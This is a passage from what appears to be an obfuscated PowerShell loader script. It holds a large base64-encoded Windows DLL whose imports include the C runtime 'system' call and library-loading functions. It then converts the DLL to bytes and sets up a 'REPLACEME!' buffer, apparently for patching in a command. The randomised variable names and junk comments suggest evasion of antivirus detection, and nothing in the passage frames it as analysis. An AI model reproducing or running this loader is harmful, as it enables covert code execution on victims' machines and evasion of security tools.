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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVigCAAAAAABaKgIAAAAAAEYqAgAAAAAANCoCAAAAAAAmKgIAAAAAABYqAgAAAAAABCoCAAAAAAD4KQIAAAAAAOwpAgAAAAAA3CkCAAAAAADGKQIAAAAAALApAgAAAAAAnikCAAAAAACKKQIAAAAAAG4pAgAAAAAAXCkCAAAAAAA+KQIAAAAAACIpAgAAAAAADikCAAAAAAD6KAIAAAAAAOAoAgAAAAAAzCgCAAAAAAC2KAIAAAAAAJwoAgAAAAAAhigCAAAAAABwKAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAICYCAAAAAABkJgIAAAAAAHwmAgAAAAAAnCYCAAAAAAC4JgIAAAAAANImAgAAAAAAQiYCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADGJwIAAAAAAK4nAgAAAAAAkicCAAAAAAB2JwIAAAAAAFQnAgAAAAAA1CcCAAAAAAA0JwIAAAAAACgnAgAAAAAAFicCAAAAAAAGJwIAAAAAAPwmAgAAAAAA6icCAAAAAAD0JwIAAAAAAAAoAgAAAAAAHCgCAAAAAAAsKAIAAAAAADwoAgAAAAAAQicCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiCQCAAAAAAAAAAAA6iYCAFAhAgAgJQIAAAAAAAAAAABIKAIA6CECADgjAgAAAAAAAAAAAG4qAgAAIAIAAAAAAAAAAAAAAAAAAAAAAAAAAABWKAIAAAAAAFoqAgAAAAAARioCAAAAAAA0KgIAAAAAACYqAgAAAAAAFioCAAAAAAAEKgIAAAAAAPgpAgAAAAAA7CkCAAAAAADcKQIAAAAAAMYpAgAAAAAAsCkCAAAAAACeKQIAAAAAAIopAgAAAAAAbikCAAAAAABcKQIAAAAAAD4pAgAAAAAAIikCAAAAAAAOKQIAAAAAAPooAgAAAAAA4CgCAAAAAADMKAIAAAAAALYoAgAAAAAAnCgCAAAAAACGKAIAAAAAAHAoAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgJgIAAAAAAGQmAgAAAAAAfCYCAAAAAACcJgIAAAAAALgmAgAAAAAA0iYCAAAAAABCJgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMYnAgAAAAAAricCAAAAAACSJwIAAAAAAHYnAgAAAAAAVCcCAAAAAADUJwIAAAAAADQnAgAAAAAAKCcCAAAAAAAWJwIAAAAAAAYnAgAAAAAA/CYCAAAAAADqJwIAAAAAAPQnAgAAAAAAACgCAAAAAAAcKAIAAAAAACwoAgAAAAAAPCgCAAAAAABCJwIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAF9fdGVsZW1ldHJ5X21haW5faW52b2tlX3RyaWdnZXIAKQBfX3RlbGVtZXRyeV9tYWluX3JldHVybl90cmlnZ2VyAAgAX19DX3NwZWNpZmljX2hhbmRsZXIAACUAX19zdGRfdHlwZV9pbmZvX2Rlc3Ryb3lfbGlzdAAALgBfX3ZjcnRfR2V0TW9kdWxlRmlsZU5hbWVXAC8AX192Y3J0X0dldE1vZHVsZUhhbmRsZVcAMQBfX3ZjcnRfTG9hZExpYnJhcnlFeFcAVkNSVU5USU1FMTQwRC5kbGwARQVzeXN0ZW0AAAQAX0NydERiZ1JlcG9ydAAFAF9DcnREYmdSZXBvcnRXAAB0AV9pbml0dGVybQB1AV9pbml0dGVybV9lAMECX3NlaF9maWx0ZXJfZGxsAHEBX2luaXRpYWxpemVfbmFycm93X2Vudmlyb25tZW50AAByAV9pbml0aWFsaXplX29uZXhpdF90YWJsZQAAtAJfcmVnaXN0ZXJfb25leGl0X2Z1bmN0aW9uAOUAX2V4ZWN1dGVfb25leGl0X3RhYmxlAMIAX2NydF9hdGV4aXQAwQBfY3J0X2F0X3F1aWNrX2V4aXQAAKQAX2NleGl0AABKBXRlcm1pbmF0ZQBoAF9fc3RkaW9fY29tbW9uX3ZzcHJpbnRmX3MAmwNfd21ha2VwYXRoX3MAALcDX3dzcGxpdHBhdGhfcwBjBXdjc2NweV9zAAB1Y3J0YmFzZWQuZGxsADAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAEAJHZXRDdXJyZW50UHJvY2Vzc0lkABQCR2V0Q3VycmVudFRocmVhZElkAADdAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAFQDSW5pdGlhbGl6ZVNMaXN0SGVhZACuBFJ0bENhcHR1cmVDb250ZXh0ALUEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAvARSdGxWaXJ0dWFsVW53aW5kAABqA0lzRGVidWdnZXJQcmVzZW50AJIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABSBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgDFAkdldFN0YXJ0dXBJbmZvVwBwA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAbQJHZXRNb2R1bGVIYW5kbGVXAABEBFJhaXNlRXhjZXB0aW9uAADUA011bHRpQnl0ZVRvV2lkZUNoYXIA3QVXaWRlQ2hhclRvTXVsdGlCeXRlAFYCR2V0TGFzdEVycm9yAAA4A0hlYXBBbGxvYwA8A0hlYXBGcmVlAACpAkdldFByb2Nlc3NIZWFwAACzBVZpcnR1YWxRdWVyeQAApAFGcmVlTGlicmFyeQCkAkdldFByb2NBZGRyZXNzAAAPAkdldEN1cnJlbnRQcm9jZXNzAHAFVGVybWluYXRlUHJvY2VzcwAAS0VSTkVMMzIuZGxsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAABkAAAA2AAAASQAAAAAAAABMAAAANwAAAAsAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjEAGAAQAAAAAAAAAAAAAAbBIBgAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQACAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAJBAAASAAAAHBRAgB9AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0nYXNJbnZva2VyJyB1aUFjY2Vzcz0nZmFsc2UnIC8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAQAgAAAAIK4orjCuOK5AriivMK84r0CvSK9QrwAAAMABABQAAABYqGCoCKkgqSipeK0A0AEADAAAAKigAAAAQAIADAAAAACgEKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

    # Microsoft".
    [Byte[]]$MilkSilly = [Byte[]][Convert]::FromBase64String($TrainsMarket)

    # Microsoft".
    $PumpFluffy = 'REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE